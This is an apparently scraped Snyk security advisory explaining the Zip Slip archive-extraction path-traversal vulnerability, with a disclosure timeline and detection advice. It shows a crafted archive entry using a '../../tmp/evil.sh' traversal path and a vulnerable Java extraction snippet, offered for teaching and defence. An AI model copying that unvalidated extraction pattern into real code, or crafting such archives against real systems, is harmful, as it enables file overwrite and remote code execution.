[![@Coeur](https://avatars.githubusercontent.com/u/839992?s=52&v=4)](/Coeur) [![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=52&v=4)](/BlueSquare1)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.snyk.io_51bc8fc6_20250111_164557.html ===
[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)
# Zip Slip Vulnerability

Zip Slip is a widespread arbitrary file overwrite critical vulnerability, which typically results in remote command execution. It was discovered and responsibly disclosed by the Snyk Security team ahead of a public disclosure on 5th June 2018, and affects thousands of projects, including ones from HP, Amazon, Apache, Pivotal and  [many more (CVEs and full list here).](https://github.com/snyk/zip-slip-vulnerability)  Of course, this type of vulnerability has existed before, but recently it has manifested itself in a much larger number of projects and libraries.

![Zip Slip](https://res.cloudinary.com/snyk/image/upload/f_auto,q_auto,c_thumb,h_225,w_225/v1527156415/research/zipslip.png)

The vulnerability has been found in multiple ecosystems, including JavaScript, Ruby, .NET and Go, but is especially prevalent in Java, where there is no central library offering high level processing of archive (e.g. zip) files. The lack of such a library led to vulnerable code snippets being hand crafted and shared among developer communities such as  [StackOverflow.](https://stackoverflow.com/questions/981578/how-to-unzip-files-recursively-in-java)

The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../evil.sh). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. If you’d like the information on this page in a downloadable technical white paper, click the button below.

 [Download Technical White Paper](https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf)

Zip Slip is a form of directory traversal that can be exploited by extracting files from an archive. The premise of the directory traversal vulnerability is that an attacker can gain access to parts of the file system outside of the target folder in which they should reside. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. The vulnerability can also cause damage by overwriting configuration files or other sensitive resources, and can be exploited on both client (user) machines and servers.

##### Exploitable Application Flow

The two parts required to exploit this vulnerability is a malicious archive and extraction code that does not perform validation checking. Let’s look through each of these in turn. First of all, the contents of the zip file needs to have one or more files that break out of the target directory when extracted. In the example below, we can see the contents of a zip file. It has two files, a good.sh file which would be extracted into the target directory and an evil.sh file which is trying to traverse up the directory tree to hit the root and then add a file into the tmp directory. When you attempt to cd .. in the root directory, you still find yourself in the root directory, so a malicious path could contain many levels of ../ to stand a better chance of reaching the root directory, before trying to traverse to sensitive files.

```
  5 Tue Jun 5 11:04:29 BST 2018 good.sh 20 Tue Jun 5 11:04:42 BST 2018 ../../../../../../../../tmp/evil.sh
```

The contents of this zip file have to be hand crafted. Archive creation tools don’t typically allow users to add files with these paths, despite the zip specification allowing it. However, with the right tools, it’s easy to create files with these paths.

 The second thing you’ll need to exploit this vulnerability is to extract the archive, either using your own code or a library. The vulnerability exists when the extraction code omits validation on the file paths in the archive. An example of a vulnerable code snippet (example shown in Java) can be seen below.

```
  1   Enumeration<ZipEntry>entries = zip.getEntries();
  2   while (entries.hasMoreElements()) {
  3       ZipEntry e = entries.nextElement();
  4       File f = new File(destinationDir, e.getName());
  5       InputStream input = zip.getInputStream(e);
  6       IOUtils.copy(input, write(f));
  7   }
```

You can see on line 4, e.getName() is concatenated with the target directory, dir, without being validated. At this point, when our zip archive gets to our evil.sh, it will append the full path (including every ../) of the zip entry to the target directory resulting in evil.sh being written outside of the target directory.

 To see Zip Slip in action,  [watch us exploit the vulnerable java-goof application](https://www.youtube.com/watch?v=l1MT5lr4p9o)  , a sample application used to show many known vulnerabilities.

##### Are you Vulnerable?

You are vulnerable if you are either using a library which contains the Zip Slip vulnerability or your project directly contains vulnerable code, which extracts files from an archive without the necessary directory traversal validation. Snyk is maintaining a [GitHub repository listing all](https://github.com/snyk/zip-slip-vulnerability) projects that have been found vulnerable to Zip Slip and have been responsibly disclosed to, including fix dates and versions. The repository is open to contributions from the wider community to ensure it holds the most up to date status.s.

##### What action should you take?

Here are some steps you can take to check if your project’s dependencies of code contain the Zip Slip vulnerability:

##### 1. Search through your projects for vulnerable code.

JavaGroovyJavaScript.NETGoRuby & Python
##### 2. Add Zip Slip Security Testing to your application build pipeline

If you’d prefer not to search through your direct and transitive dependencies (of which you likely have hundreds) to determine if you’re using a vulnerable library, you can choose a dependency vulnerability scanning tool, like Snyk. It’s a good practice to add security testing into your development lifecycle stages, such as during development, CI, deployment and production. You can test your own projects (all the ecosystems mentioned above are supported) to determine if they are vulnerable to Zip Slip.

##### Other vulnerable projects

Vulnerable projects include projects in various ecosystems that either use the libraries mentioned above or directly include vulnerable code. Of the many thousands of projects that have contained similar vulnerable code samples or accessed vulnerable libraries, the most significant include: Oracle, Amazon, Spring/Pivotal, Linkedin, Twitter, Alibaba, Jenkinsci, Eclipse, OWASP, SonarQube, OpenTable, Arduino, ElasticSearch, Selenium, JetBrains and Google.

##### Thank you!

The Snyk security team would like for thank all the vendors, project owners and the community members that helped raise awareness, find and fix vulnerabilities in projects across many ecosystems.

### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)
##### Zip Slip Disclosure Timeline

This disclosure timeline details our actions from the first private disclosure on April 15th 2018.

| Date | Events |
| --- | --- |
| Apr 15th 2018 | Initial private disclosure to codehous/plexus-archiver, zip4j, adm-zip, unzipper, mholt/archiver |
| Apr 15th 2018 | Confirmed codehous/plexus-archiver, zip4j, mholt/archiver |
| Apr 17th 2018 | Confirmed adm-zip |
| Apr 17th 2018 | unzipper fix released, v0.8.13, (CVE-2018-1002203} |
| Apr 17th 2018 | Snyk submitted a fix to mholt/archiver and unzipper |
| Apr 17th 2018 | mholt/archiver fix released (CVE-2018-1002207} |
| Apr 18th 2018 | Private disclosure to ZeroTurnaround zt-zip |
| view more | |
| --- | --- |

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.


